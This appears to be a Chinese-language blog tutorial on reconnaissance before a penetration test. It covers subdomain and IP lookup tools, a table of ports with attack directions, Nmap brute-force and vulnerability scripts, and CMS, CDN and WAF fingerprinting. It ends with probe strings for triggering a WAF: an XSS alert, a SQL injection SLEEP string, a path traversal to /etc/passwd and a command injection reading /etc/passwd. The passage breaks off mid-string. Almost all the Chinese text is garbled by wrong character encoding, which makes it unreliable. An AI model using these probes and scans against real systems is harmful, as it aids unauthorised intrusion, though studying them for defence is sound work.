‰∏ÄËà¨ÂÖ∂‰∏ªÂüüÈÉΩÊòØÈáçÁÇπÈò≤Êä§Âå∫ÂüüÔºåÊâÄ‰ª•‰∏çÂ¶ÇÂÖàËøõÂÖ•ÁõÆÊ†áÁöÑÊüê‰∏™Â≠êÂüüÔºåÁÑ∂ÂêéÂÜçÊÉ≥ÂäûÊ≥ïËøÇÂõûÊé•ËøëÁúüÊ≠£ÁöÑÁõÆÊ†áÔºåËøôÊó†ÁñëÊòØ‰∏™ÊØîËæÉÂ•Ω</p><p>ÁöÑÈÄâÊã©„ÄÇ</p><ul><li><p><strong><a href="https://searchdns.netcraft.com/">What‚Äôs that site running?</a></strong></p></li><li><p><strong><a href="https://github.com/euphrat1ca/LayerDomainFinder">LayerÂ≠êÂüüÂêçÊåñÊéòÊú∫</a></strong></p></li><li><p><strong><a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></strong></p></li><li><p><strong><a href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a></strong></p></li><li><p><strong>GoogleËØ≠Ê≥ï  site:xxx.com</strong></p></li><li><p><strong><a href="https://crt.sh/">ËØÅ‰π¶ÈÄèÊòéÂ∫¶ÂÖ¨ÂºÄÊõ∞ÂøóÊûö‰∏æ</a></strong></p></li></ul><h4 id="IPÁõ∏ÂÖ≥‰ø°ÊÅØ"><a href="#IPÁõ∏ÂÖ≥‰ø°ÊÅØ" class="headerlink" title="IPÁõ∏ÂÖ≥‰ø°ÊÅØ"></a>IPÁõ∏ÂÖ≥‰ø°ÊÅØ</h4><ul><li><p><strong><a href="http://ip.chinaz.com/">IPÊü•ËØ¢</a></strong></p></li><li><p><strong><a href="https://ip.chinaz.com/linksip">ÂêåIPÊü•ËØ¢</a></strong></p></li><li><p><strong><a href="https://www.maxmind.com/en/home">IPÁªèÁ∫¨Â∫¶</a></strong></p></li></ul><h4 id="Á´ØÂè£ÊúçÂä°Áõ∏ÂÖ≥‰ø°ÊÅØ"><a href="#Á´ØÂè£ÊúçÂä°Áõ∏ÂÖ≥‰ø°ÊÅØ" class="headerlink" title="Á´ØÂè£ÊúçÂä°Áõ∏ÂÖ≥‰ø°ÊÅØ"></a>Á´ØÂè£ÊúçÂä°Áõ∏ÂÖ≥‰ø°ÊÅØ</h4><p>Êü•ÁúãÊú¨Êú∫Á´ØÂè£</p><p>WindowsÔºönetstat -aon|findstr 3306</p><p>Linux: netstat -an|grep 3306 </p><p>ËøúÁ®ãÊú∫Âô®Á´ØÂè£</p><p>telnet 192.168.142.137 80 </p><p>wget 192.168.142.137 80 </p><p>nc -vz 192.168.142.137 445</p><h5 id="Â∏∏ËßÅÁ´ØÂè£ÂèäÊºèÊ¥û"><a href="#Â∏∏ËßÅÁ´ØÂè£ÂèäÊºèÊ¥û" class="headerlink" title="Â∏∏ËßÅÁ´ØÂè£ÂèäÊºèÊ¥û"></a>Â∏∏ËßÅÁ´ØÂè£ÂèäÊºèÊ¥û</h5><h6 id="Êñá‰ª∂ÂÖ±‰∫´ÊúçÂä°"><a href="#Êñá‰ª∂ÂÖ±‰∫´ÊúçÂä°" class="headerlink" title="Êñá‰ª∂ÂÖ±‰∫´ÊúçÂä°"></a>Êñá‰ª∂ÂÖ±‰∫´ÊúçÂä°</h6><table><thead><tr><th align="center">Á´ØÂè£Âè∑</th><th>Á´ØÂè£ËØ¥Êòé</th><th>ÊîªÂáªÊñπÂêë</th></tr></thead><tbody><tr><td align="center">21&#x2F;22&#x2F;69</td><td>FTP&#x2F;SFTPÊñá‰ª∂‰º†ËæìÂçèËÆÆ</td><td>ÂÖÅËÆ∏ÂåøÂêç‰∏ä‰º†„ÄÅ‰∏ãËΩΩ„ÄÅÁàÜÁ†¥ÂíåÂóÖÊé¢Êìç‰Ωú</td></tr><tr><td align="center">2049</td><td>NFSÊúçÂä°ÔºàNetworkFileSystemÔºâ</td><td>ÈÖçÁΩÆ‰∏çÂΩì</td></tr><tr><td align="center">139</td><td>SambaÊúçÂä°</td><td>ÁàÜÁ†¥„ÄÅÊú™ÊéàÊùÉËÆøÈóÆ„ÄÅËøúÁ®ã‰ª£Á†ÅÂíåÊâßË°å</td></tr><tr><td align="center">389</td><td>LDAPÁõÆÂΩïËÆøÈóÆÂçèËÆÆ</td><td>Ê≥®ÂÖ•„ÄÅÂÖÅËÆ∏ÂåøÂêçËÆøÈóÆ„ÄÅÂº±Âè£‰ª§</td></tr></tbody></table><h6 id="ËøúÁ®ãËøûÊé•ÊúçÂä°Á´ØÂè£"><a href="#ËøúÁ®ãËøûÊé•ÊúçÂä°Á´ØÂè£" class="headerlink" title="ËøúÁ®ãËøûÊé•ÊúçÂä°Á´ØÂè£"></a>ËøúÁ®ãËøûÊé•ÊúçÂä°Á´ØÂè£</h6><table><thead><tr><th align="center">Á´ØÂè£Âè∑</th><th>Á´ØÂè£ËØ¥Êòé</th><th>ÊîªÂáªÊñπÂêë</th></tr></thead><tbody><tr><td align="center">22</td><td>SSHËøúÁ®ãËøûÊé•</td><td>ÁàÜÁ†¥„ÄÅSSHÈößÈÅìÂèäÂÜÖÁΩë‰ª£ÁêÜËΩ¨Âèë Êñá‰ª∂‰º†Ëæì</td></tr><tr><td align="center">23</td><td>TelnetËøúÁ®ãËøûÊé•</td><td>ÁàÜÁ†¥„ÄÅÂóÖÊé¢„ÄÅÂº±Âè£‰ª§</td></tr><tr><td align="center">3389</td><td>RDPËøúÁ®ãÊ°åÈù¢ËøûÊé•</td><td>ShiftÂêéÈó®ÔºàWindowsServer2003‰ª•‰∏ãÁöÑÁ≥ªÁªüÔºâ„ÄÅÁàÜÁ†¥</td></tr><tr><td align="center">5900</td><td>VNC</td><td>Âº±Âè£‰ª§ÁàÜÁ†¥</td></tr><tr><td align="center">5632</td><td>PcAnywhereËøúÁ®ãÊéßÂà∂ÊúçÂä°</td><td>ÊäìÂØÜÁ†Å„ÄÅ‰ª£Á†ÅÊâßË°å</td></tr></tbody></table><h6 id="Êï∞ÊçÆÂ∫ìÊúçÂä°Á´ØÂè£"><a href="#Êï∞ÊçÆÂ∫ìÊúçÂä°Á´ØÂè£" class="headerlink" title="Êï∞ÊçÆÂ∫ìÊúçÂä°Á´ØÂè£"></a>Êï∞ÊçÆÂ∫ìÊúçÂä°Á´ØÂè£</h6><table><thead><tr><th>Á´ØÂè£Âè∑</th><th>Á´ØÂè£ËØ¥Êòé</th><th>ÊîªÂáªÊñπÂêë</th></tr></thead><tbody><tr><td>3306</td><td>MySQL</td><td>Ê≥®ÂÖ•„ÄÅÊèêÊùÉ„ÄÅÁàÜÁ†¥</td></tr><tr><td>1433</td><td>MSSQLÊï∞ÊçÆÂ∫ì</td><td>Ê≥®ÂÖ•„ÄÅÊèêÊùÉ„ÄÅSAÂº±Âè£‰ª§</td></tr><tr><td>1521</td><td>OracleÊï∞ÊçÆÂ∫ì</td><td>TNSÁàÜÁ†¥„ÄÅÊ≥®ÂÖ•„ÄÅÂèçÂºπshell</td></tr><tr><td>5432</td><td>PostgreSQLÊï∞ÊçÆÂ∫ì</td><td>ÁàÜÁ†¥„ÄÅÊ≥®ÂÖ•„ÄÅÂº±Âè£‰ª§</td></tr><tr><td>27017&#x2F;27018</td><td>MongoDB</td><td>ÁàÜÁ†¥„ÄÅÊú™ÊéàÊùÉËÆøÈóÆ</td></tr><tr><td>6379</td><td>RedisÊï∞ÊçÆÂ∫ì</td><td>ÂèØÂ∞ùËØïÊú™ÊéàÊùÉËÆøÈóÆ„ÄÅÂº±Âè£‰ª§ÁàÜÁ†¥</td></tr><tr><td>5000</td><td>Sysbase&#x2F;DB2Êï∞ÊçÆÂ∫ì</td><td>ÁàÜÁ†¥„ÄÅÊ≥®ÂÖ•</td></tr></tbody></table><h6 id="ÈÇÆ‰ª∂ÊúçÂä°Á´ØÂè£"><a href="#ÈÇÆ‰ª∂ÊúçÂä°Á´ØÂè£" class="headerlink" title="ÈÇÆ‰ª∂ÊúçÂä°Á´ØÂè£"></a>ÈÇÆ‰ª∂ÊúçÂä°Á´ØÂè£</h6><table><thead><tr><th>Á´ØÂè£Âè∑</th><th>Á´ØÂè£ËØ¥Êòé</th><th>ÊîªÂáªÊñπÂêë</th></tr></thead><tbody><tr><td>25</td><td>SMTPÈÇÆ‰ª∂ÊúçÂä°</td><td>ÈÇÆ‰ª∂‰º™ÈÄ†</td></tr><tr><td>110</td><td>POP3ÂçèËÆÆ</td><td>ÁàÜÁ†¥„ÄÅÂóÖÊé¢</td></tr><tr><td>143</td><td>IMAPÂçèËÆÆ</td><td>ÁàÜÁ†¥</td></tr></tbody></table><h6 id="ÁΩëÁªúÂ∏∏ËßÅÂçèËÆÆÁ´ØÂè£"><a href="#ÁΩëÁªúÂ∏∏ËßÅÂçèËÆÆÁ´ØÂè£" class="headerlink" title="ÁΩëÁªúÂ∏∏ËßÅÂçèËÆÆÁ´ØÂè£"></a>ÁΩëÁªúÂ∏∏ËßÅÂçèËÆÆÁ´ØÂè£</h6><table><thead><tr><th>Á´ØÂè£Âè∑</th><th>Á´ØÂè£ËØ¥Êòé</th><th>ÊîªÂáªÊñπÂêë</th></tr></thead><tbody><tr><td>53</td><td>DNSÂüüÂêçÁ≥ªÁªü</td><td>ÂÖÅËÆ∏Âå∫Âüü‰º†ÈÄÅ„ÄÅDNSÂä´ÊåÅ  ÁºìÂ≠òÊäïÊØí„ÄÅÊ¨∫È™ó</td></tr><tr><td>67&#x2F;68</td><td>DHCPÊúçÂä°</td><td>Âä´ÊåÅ„ÄÅÊ¨∫È™ó</td></tr><tr><td>161</td><td>SNMPÂçèËÆÆ</td><td>ÁàÜÁ†¥„ÄÅÊêúÈõÜÁõÆÊ†áÂÜÖÁΩë‰ø°ÊÅØ</td></tr></tbody></table><h6 id="ÁâπÊÆäÊúçÂä°Á´ØÂè£"><a href="#ÁâπÊÆäÊúçÂä°Á´ØÂè£" class="headerlink" title="ÁâπÊÆäÊúçÂä°Á´ØÂè£"></a>ÁâπÊÆäÊúçÂä°Á´ØÂè£</h6><table><thead><tr><th>Á´ØÂè£Âè∑</th><th>Á´ØÂè£ËØ¥Êòé</th><th>ÊîªÂáªÊñπÂêë</th></tr></thead><tbody><tr><td>2181</td><td>ZookeeperÊúçÂä°</td><td>Êú™ÊéàÊùÉËÆøÈóÆ</td></tr><tr><td>8069</td><td>ZabbixÊúçÂä°</td><td>ËøúÁ®ãÊâßË°å„ÄÅSQLÊ≥®ÂÖ•</td></tr><tr><td>9200&#x2F;9300</td><td>ElasticsearchÊúçÂä°</td><td>ËøúÁ®ãÊâßË°å</td></tr><tr><td>11211</td><td>MemcachedÊúçÂä°</td><td>Êú™ÊéàÊùÉËÆøÈóÆ</td></tr><tr><td>512&#x2F;513&#x2F;514</td><td>LinuxRexecÊúçÂä°</td><td>ÁàÜÁ†¥„ÄÅrloginÁôªÂΩï</td></tr><tr><td>873</td><td>RsyncÊúçÂä°</td><td>ÂåøÂêçËÆøÈóÆ„ÄÅÊñá‰ª∂‰∏ä‰º†</td></tr><tr><td>3690</td><td>SVNÊúçÂä°</td><td>SVNÊ≥ÑÈú≤„ÄÅÊú™ÊéàÊùÉËÆøÈóÆ</td></tr><tr><td>50000</td><td>SAPManagementConsole</td><td>ËøúÁ®ãÊâßË°å</td></tr></tbody></table><h5 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h5><p>Nmap ÔºàNetwork Mapper <a href="https://nmap.org/">https://nmap.org/</a></p><p>1ÔºâÊâ´Êèè‰∏ªÊú∫(HostiDiscovery)</p><p>2ÔºâÊâ´ÊèèÁ´ØÂè£(Port ScanningÔºâ</p><p>3ÔºâÊé¢ÊµãÊìç‰ΩúÁ≥ªÁªü„ÄÅËΩØ‰ª∂ÁâàÊú¨ÔºàOperating System Detection„ÄÅVersion Detection)</p><p>ÂèÇÊï∞Á±ªÂûã</p><p>nmap‚Äìhelp</p><ul><li><p>TARGETSPECIFICATIOM:Ëá™Ê†áÔºåÂØπ‰ªÄ‰πàËøõË°åÊâ´ÊèèÔºåÊØîÂ¶ÇÊòØÂüüÂêç„ÄÅTPÊàñËÄÖÁΩëÁªú</p></li><li><p>HOSTDISCOVERY:‰∏ªÊú∫ÂèëÁé∞ÔºåÊÄé‰πàÂØπ‰∏ªÊú∫ËøõË°åÊâ´ÊèèÔºåÊØîÂ¶ÇÁÆÄÂçïÊâ´ÊèèÔºåËøòÊòØÂÖ®ÈÉ®ÔºåÊâ´‰∏ÄÈÅçÔºåÊàñËÄÖÁî®Áõ∏Â∫îÁöÑÂçèËÆÆÊâ´</p></li><li><p>SCANTECHNIOQUESÔºöÊâ´ÊèèÊäÄÊúØÔºåÂçèËÆÆÊó•Âã∫ËÆæÁΩÆ</p></li><li><p>PORTSPECIFICATIONANDSCANORDER:Á´ØÂè£ÂíåÊâ´ÊèèÈ°∫Â∫èËÆæÁΩÆ SERVICEVERSIONDETECTION:ÊúçÂä°ÂíåÁâàÊú¨ËØÜÂà´</p></li><li><p>SCRIPT SCAN:‰ΩøÁî®ËÑöÊú¨ÔºånmapÊú¨Ë∫´ÂÜÖÁΩÆ‰∫ÜÂ§ßÈáèÁöÑluaËÑöÊú¨ÔºåËÄå‰∏îËøòÂèØ‰ª•Ëá™Â∑±ÁºñÂÜôËÑöÊú¨</p></li><li><p>OS DETECTION:Êìç‰ΩúÁ≥ªÁªüËØÜÂà´</p></li><li><p>TIMING AND PERFORMANCE:Êó∂Èó¥ÂíåÊÄßËÉΩËÆæÁΩÆÔºåÊØîÂ¶ÇÊâ´ÊèèÈ¢ëÁéá„ÄÅÈáçËØïÊ¨°Êï∞Á≠âÁ≠â FIREWALL&#x2F;IDS EVASION AND SPOOFING:Èò≤ÁÅ´Â¢ôÁªïËøáÂíåÊ¨∫È™óÔºåÊØîÂ¶Ç‰ΩøÁî®‰ª£ÁêÜÂÅáIPÁ≠â</p></li><li><p>OUTPUT:ÊääÊâ´ÊèèÊé•Âá∫ËæìÂá∫Âà∞Êñá‰ª∂ MISCÔºöÂêØÁî®IPv6Á≠âÁ≠âÈÖçÁΩÆ</p></li></ul><p>nmapÊú¨Ë∫´ÂÜÖÁΩÆ‰∫ÜÂ§ßÈáèÁöÑluaËÑöÊú¨ÔºåËÄå‰∏îËøòÂèØ‰ª•Ëá™Â∑±Â∑≤ÁºñÂÜôËÑöÊú¨ </p><p>Is &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F; I wc -1</p><p>ÂÖ®ÈÉ®Ê∏ÖÂçïÔºö<a href="https://nmap.org/book/nse.html">Nmap Scripting Engine</a></p><p>‰æãÂ¶ÇÔºö</p><p>nmap 192.168.142.137 ‚Äìscript http-enum Âàó‰∏æHTTPÊúçÂä°</p><p>nmap‚Äìscript&#x3D;authÁªïËøáÈâ¥ÊùÉ </p><p>nmap‚Äìscript&#x3D;brute Êö¥ÂäõÁ†¥Ëß£ nmap ‚Äìscript&#x3D;vuln Êâ´ÊèèÊºèÊ¥û</p><h4 id="ÊåáÁ∫πËØÜÂà´"><a href="#ÊåáÁ∫πËØÜÂà´" class="headerlink" title="ÊåáÁ∫πËØÜÂà´"></a>ÊåáÁ∫πËØÜÂà´</h4><p><strong>ËØÜÂà´ÂØπË±°</strong></p><ol><li>CMS‰ø°ÊÅØÔºöÊØîÂ¶ÇDiscuz„ÄÅÁªáÊ¢¶„ÄÅÂ∏ùÂõΩCMS„ÄÅPHPCMS„ÄÅECshopÁ≠â</li><li>ÂâçÁ´ØÊäÄÊúØÔºöÊØîÂ¶ÇHTML5„ÄÅjquery„ÄÅbootstrap„ÄÅVue„ÄÅaceÁ≠â;</li><li>ÂºÄÂèëËØ≠Ë®ÄÔºöÊØîÂ¶ÇPHP„ÄÅJava„ÄÅRuby„ÄÅPython„ÄÅC#Á≠â;</li><li>WebÊúçÂä°Âô®ÔºöÊØîÂ¶ÇApache„ÄÅ Nginx„ÄÅIIS„ÄÅlighttpdÁ≠â;</li><li>Â∫îÁî®ÊúçÂä°Âô®ÔºöÊØîÂ¶ÇTomcat„ÄÅJboss„ÄÅWeblogic„ÄÅWebsphereÁ≠â;</li><li>Êìç‰ΩúÁ≥ªÁªü‰ø°ÊÅØÔºöÊØîÂ¶ÇLinux„ÄÅwin2k8„ÄÅwin7„ÄÅKali„ÄÅCentosÁ≠â;</li><li>CDN‰ø°ÊÅØÔºöÊòØÂê¶‰ΩøÁî®CDNÔºåÂ¶Çcloudflare„ÄÅÂ∏ùËÅî„ÄÅËìùËÆØ„ÄÅÁΩëÂÆø„ÄÅ‰∏ÉÁâõ‰∫ë„ÄÅÈòøÈáå‰∫ëÁ≠âÔºõ</li><li>WAF‰ø°ÊÅØÔºöÊòØÂê¶‰ΩøÁî®WAFÔºåÂ¶ÇDÁõæ„ÄÅ‰∫ëÈîÅ„ÄÅÂÆùÂ°î„ÄÅÂÆâÂÖ®Áãó„ÄÅ360Á≠â</li></ol><h5 id="CMSÊåáÁ∫πËØÜÂà´"><a href="#CMSÊåáÁ∫πËØÜÂà´" class="headerlink" title="CMSÊåáÁ∫πËØÜÂà´"></a>CMSÊåáÁ∫πËØÜÂà´</h5><p>ÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªü</p><p>Content Management System</p><p>ÈÄöËøáÂÖ≥ÈîÆÁâπÂæÅÂô®„ÄÅÂºÄÂèëËØ≠Ë®Ä„ÄÅÁâàÊú¨Á≠âÁ≠â</p><p>ËØÜÂà´Âá∫ÊúàÊ†áÁöÑCMSÁ≥ªÁªü„ÄÅÊúçÂä°Êìç‰ΩúÁ≥ªÁªü„ÄÅCDN„ÄÅWAFÁöÑÁ±ªÂà´</p><h6 id="Â∏∏ËßÅÁöÑCMS"><a href="#Â∏∏ËßÅÁöÑCMS" class="headerlink" title="Â∏∏ËßÅÁöÑCMS"></a><strong>Â∏∏ËßÅÁöÑCMS</strong></h6><p>ÂçöÂÆ¢ÔºàÊØîÂ¶ÇCSDN„ÄÅÂçöÂÆ¢Âõ≠Ôºâ„ÄÅÂæÆÂçö„ÄÅÁ´ô„ÄÅÂØºËà™ÁΩëÁ´ôÔºàhao123Ôºâ„ÄÅ‰ø°ÊÅØÂàÜÁ±ªÔºàÁü•‰πéÔºâ„ÄÅÂïÜÂüé„ÄÅÁôæÁßë‚Ä¶Ôºé„ÄÄ</p><p>ÈóÆÁ≠îÁΩëÁ´ô„ÄÅ‰ºÅ‰∏öÂÆòÁΩë„ÄÅÂ≠¶Ê†°ÂÆòÁΩë„ÄÅÂåªÈô¢ÂÆòÁΩë„ÄÅÂõ¢Ë¥≠ÁΩë(58Ôºâ</p><p><img src="CMS.png" loading="lazy"></p><h6 id="ÂêÑÁ±ªÁΩëÁ´ôÂºÄÊ∫êCMS"><a href="#ÂêÑÁ±ªÁΩëÁ´ôÂºÄÊ∫êCMS" class="headerlink" title="ÂêÑÁ±ªÁΩëÁ´ôÂºÄÊ∫êCMS"></a><strong>ÂêÑÁ±ªÁΩëÁ´ôÂºÄÊ∫êCMS</strong></h6><ul><li>‰ºÅ‰∏öÂª∫Á´ôÁ≥ªÁªüÔºöMetlnfo(Á±≥Êãì)„ÄÅËùâÁü•„ÄÅSiteServer CMSÁ≠â;</li><li>B2CÂïÜÂüéÁ≥ªÁªüÔºöÂïÜÊ¥æShopex„ÄÅECshop„ÄÅHiShop„ÄÅXpShopÁ≠â</li><li>Èó®Êà∑Âª∫Á´ôÁ≥ªÁªüÔºöDedeCMS(ÁªáÊ¢¶)„ÄÅÂ∏ùÂõΩCMS„ÄÅPHPCMS„ÄÅÂä®ÊòìCmsTopÁ≠â;</li><li>ÂçöÂÆ¢Á≥ªÁªüÔºöWordPress„ÄÅZ-BlogÁ≠â</li><li>ËÆ∫ÂùõÁ§æÂå∫ÔºöDiscuz„ÄÅPHPwind„ÄÅWeCenterÁ≠â</li><li>ÈóÆÁ≠îÁ≥ªÁªüÔºöTipask„ÄÅwhatsnsÁ≠â</li><li>Áü•ËØÜÁôæÁßëÁ≥ªÁªüÔºöHDwiki;</li><li>B2BÈó®Êà∑Á≥ªÁªüÔºöDestoon„ÄÅB2Bbuilder„ÄÅÂèãÈÇªB2BÁ≠â</li><li>‰∫∫ÊâçÊãõËÅòÁΩëÁ´ôÁ≥ªÁªüÔºöÈ™ëÂ£´CMS„ÄÅPHP‰∫ë‰∫∫ÊâçÁÆ°ÁêÜÁ≥ªÁªü</li><li>Êàø‰∫ßÁΩëÁ´ôÁ≥ªÁªüÔºöFangCmsÁ≠â;</li><li>Âú®Á∫øÊïôËÇ≤Âª∫Á´ôÁ≥ªÁªüÔºöKesion„ÄÅEduSoho;</li><li>ÁîµÂΩ±ÁΩëÁ´ôÁ≥ªÁªüÔºöËãπÊûúcMS„ÄÅctcms„ÄÅmovcmsÁ≠â</li><li>Â∞èËØ¥ÊñáÂ≠¶Âª∫Á´ôÁ≥ªÁªüÔºöÊù∞Â•áCMS</li></ul><h6 id="CMSÊåáÁ∫πËØÜÂà´ÊÄùË∑Ø"><a href="#CMSÊåáÁ∫πËØÜÂà´ÊÄùË∑Ø" class="headerlink" title="CMSÊåáÁ∫πËØÜÂà´ÊÄùË∑Ø"></a>CMSÊåáÁ∫πËØÜÂà´ÊÄùË∑Ø</h6><p>ÁâàÊùÉ‰ø°ÊÅØ„ÄÅÁâπÂÆöÊñá‰ª∂MD5ÂÄº„ÄÅÊü•ÁúãÁΩëÈ°µÊ∫ê‰ª£Á†Å„ÄÅÈÄöËøáÁâπÂÆöÊñá‰ª∂ÂàÜÊûê</p><h6 id="CMSËØÜÂà´Â∑•ÂÖ∑"><a href="#CMSËØÜÂà´Â∑•ÂÖ∑" class="headerlink" title="CMSËØÜÂà´Â∑•ÂÖ∑"></a>CMSËØÜÂà´Â∑•ÂÖ∑</h6><ul><li>whatweb(kali)</li><li>ÊµèËßàÂô®Êèí‰ª∂</li><li><ul><li><a href="https://www.wappalyzer.com/">Wappalyzer</a></li><li><a href="https://www.whatruns.com/">whatruns</a></li></ul></li><li>Âú®Á∫øÁΩëÁ´ô</li><li><ul><li><a href="http://finger.tidesec.com/">ÊΩÆÊ±êÊåáÁ∫πËØÜÂà´</a></li></ul></li><li>Á¶ªÁ∫øÁΩëÁ´ô</li><li><ul><li>Âæ°ÂâëÊåáÁ∫πÊâ´ÊèèÂô®(ÈúÄË¶Å.NET FrameworkÔºâ</li><li>Test404ËΩªÈáèCMSÊåáÁ∫πËØÜÂà´v2.1</li><li><a href="https://github.com/Tuhinshubhra/CMSeeK">CMSeek</a></li></ul></li></ul><h5 id="CDNÊåáÁ∫πËØÜÂà´"><a href="#CDNÊåáÁ∫πËØÜÂà´" class="headerlink" title="CDNÊåáÁ∫πËØÜÂà´"></a>CDNÊåáÁ∫πËØÜÂà´</h5><ul><li>(Ë∂ÖÁ∫ß)ping</li><li>nslookup</li><li>ldb(load balance detector  Kali)</li><li>ÂõΩÂÜÖÔºö</li><li><ul><li><a href="http://cdn.chinaz.com/">ÂêÑÂú∞CDNËäÇÁÇπÊµãÈÄüÁªìÊûú - CDN‰∫ëËßÇÊµã - Á´ôÈïøÂ∑•ÂÖ∑</a></li></ul></li><li>ÂõΩÂ§ñÔºö</li><li><ul><li><a href="https://www.cdnplanet.com/tools/cdnfinder/">CDN Finder</a></li></ul></li><li>ËÑöÊú¨Ôºö</li><li><ul><li><a href="https://github.com/boy-hack/w8fuckcdn/">w8Fuckcdn</a> </li><li><a href="https://github.com/3xp10it/xcdn">xcdn</a></li></ul></li></ul><h5 id="WAFÊåáÁ∫πËØÜÂà´"><a href="#WAFÊåáÁ∫πËØÜÂà´" class="headerlink" title="WAFÊåáÁ∫πËØÜÂà´"></a>WAFÊåáÁ∫πËØÜÂà´</h5><p>Web. Application Firewall Web Â∫îÁî®Èò≤ÁÅ´Â¢ô</p><p>ËøáÊª§HTTP&#x2F;HTTPSÁöÑËØ∑Ê±Ç</p><h6 id="WAFÁöÑ‰ΩúÁî®"><a href="#WAFÁöÑ‰ΩúÁî®" class="headerlink" title="WAFÁöÑ‰ΩúÁî®"></a>WAFÁöÑ‰ΩúÁî®</h6><ul><li><p>SQL Injection (SQLi)ÔºöÈòªÊ≠¢SQLÊ≥®ÂÖ•</p></li><li><p>Cross Site Scripting (XSS)ÔºöÈòªÊ≠¢Ë∑®Á´ôËÑöÊú¨ÊîªÂáª</p></li><li><p>Local File Inclusion (LFI)Ôºö ÈòªÊ≠£Ê≠¢Âà©Áî®Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûËøõË°åÊîªÂáª</p></li><li><p>Remote File Inclusione(RFl)ÔºöÈòªÊ≠¢Âà©Áî®ËøúÁ®ãÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥ûËøõË°åÊîªÂáª</p></li><li><p>Remote Code Execution(RCE)ÔºöÈòªÊ≠£Ê≠¢Âà©Áî®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûËøõË°åÊîªÂáª PHP Code InjectiodÔºöÈòªÊ≠£Ê≠¢PHP‰ª£Á†ÅÊ≥®ÂÖ•</p></li><li><p>HTTP Protocol ViolationsÔºöÈòªÊ≠¢ËøùÂèçHTTPÂçèËÆÆÁöÑÊÅ∂ÊÑèËÆøÈóÆ</p></li><li><p>HTTPoXyÔºöÈòªÊ≠¢Âà©Áî®ËøúÁ®ã‰ª£ÁêÜÊÑüÊüìÊºèÊ¥ûËøõË°åÊîªÂáª SshllshockÔºöÈòªÊ≠¢Âà©Áî®ShellshockÊºèÊ¥ûËøõË°åÊîªÂáª</p></li><li><p>Session FixationÔºö ÈòªÊ≠¢Âà©Áî®Session‰ºöËØùiD‰∏çÂèòÁöÑÊºèÊ¥ûËøõË°åÊîªÂáª ScannerDetectionÔºöÈòªÊ≠¢ÈªëÂÆ¢Êâ´ÊèèÁΩëÁ´ô</p></li><li><p>Metadata&#x2F;ErrorLeakagesÔºöÈòªÊ≠¢Ê∫ê‰ª£Á†Å&#x2F;ÈîôËØØ‰ø°ÊÅØÊ≥ÑÈú≤ Project Honey Pot BlacklistÔºöËúúÁΩêÈ°πÁõÆÈªëÂêçÂçï</p></li><li><p>GeolP Country BlockingÔºöÊ†πÊçÆÂà§Êñ≠IPÂú∞ÂùÄÂΩíÂ±ûÂú∞Êù•ËøõË°åIPÈòªÊñ≠</p></li></ul><h6 id="WAFÂàÜÁ±ª"><a href="#WAFÂàÜÁ±ª" class="headerlink" title="WAFÂàÜÁ±ª"></a>WAFÂàÜÁ±ª</h6><p>Á°¨‰ª∂ÂûãWAFÂéÇÂïÜÂÆâË£ÖÔºâ</p><p>‰∫ëWAFÔºàÈòøÈáå‰∫ë„ÄÅËÖæËÆØ‰∫ë„ÄÅÂçé‰∏∫‰∫ë.. Ôºâ</p><p>ËΩØ‰ª∂Âûã WAFÔºàÈÉ®ÁΩ≤Âú® Apache„ÄÅNginx Á≠â HTTPServer‰∏≠Ôºâ</p><h6 id="Â∏∏ËßÅWAFÂéÇÂïÜ"><a href="#Â∏∏ËßÅWAFÂéÇÂïÜ" class="headerlink" title="Â∏∏ËßÅWAFÂéÇÂïÜ"></a>Â∏∏ËßÅWAFÂéÇÂïÜ</h6><p>ÂêÑÁßç‰∫ëÔºöÈòøÈáå‰∫ë„ÄÅËÖæËÆØ‰∫ë„ÄÅÂçé‰∏∫‰∫ë„ÄÅÁôæÂ∫¶‰∫ë</p><p>ÂÆâÂÖ®Áãó„ÄÅÂÆùÂ°î„ÄÅ360„ÄÅÁü•ÈÅìÂàõÂÆá„ÄÅÈïø‰∫≠„ÄÅÂÆâÊÅí„ÄÅ</p><h6 id="WAFËØÜÂà´ÊÄùË∑Ø"><a href="#WAFËØÜÂà´ÊÄùË∑Ø" class="headerlink" title="WAFËØÜÂà´ÊÄùË∑Ø"></a>WAFËØÜÂà´ÊÄùË∑Ø</h6><ul><li><p>È¢ùÂ§ñÁöÑcookie;</p></li><li><p>‰ªª‰ΩïÂìçÂ∫îÊàñËØ∑Ê±ÇÁöÑÈôÑÂä†Ê†áÂ§¥;</p></li><li><p>ÂìçÂ∫îÂÜÖÂÆπÔºàÂ¶ÇÊûúË¢´ÈòªÊ≠¢ËØ∑Ê±ÇÔºâ</p></li><li><p>ÂìçÂ∫î‰ª£Á†ÅÔºàÂ¶ÇÊûúË¢´ÈòªÊ≠¢ËØ∑Ê±ÇÔºâ</p></li><li><p>IPÂú∞ÂùÄÔºà‰∫ëWAFÔºâÔºõ</p></li><li><p>JSÂÆ¢Êà∑Á´ØÊ®°ÂùóÔºàÂÆ¢Êà∑Á´ØWAFÔºâ</p></li></ul><h6 id="WAFËß¶ÂèëÊã¶Êà™ÊñπÂºè"><a href="#WAFËß¶ÂèëÊã¶Êà™ÊñπÂºè" class="headerlink" title="WAFËß¶ÂèëÊã¶Êà™ÊñπÂºè"></a>WAFËß¶ÂèëÊã¶Êà™ÊñπÂºè</h6><pre class="language-javascript" data-language="javascript"><code class="language-javascript">xsstring <span class="token operator">=</span> '<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">sqlistring &#x3D; &quot;UNION SELECT ALL FROM information schema AND &#39; or SLEEP(5) or &#39;&quot;</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">Ifistring <span class="token operator">=</span> "<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/./<span class="token punctuation">..</span>/etc/passwd</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">rcestring <span class="token operator">=</span> <span class="token string">'/bin/cat /etc/passwd; ping 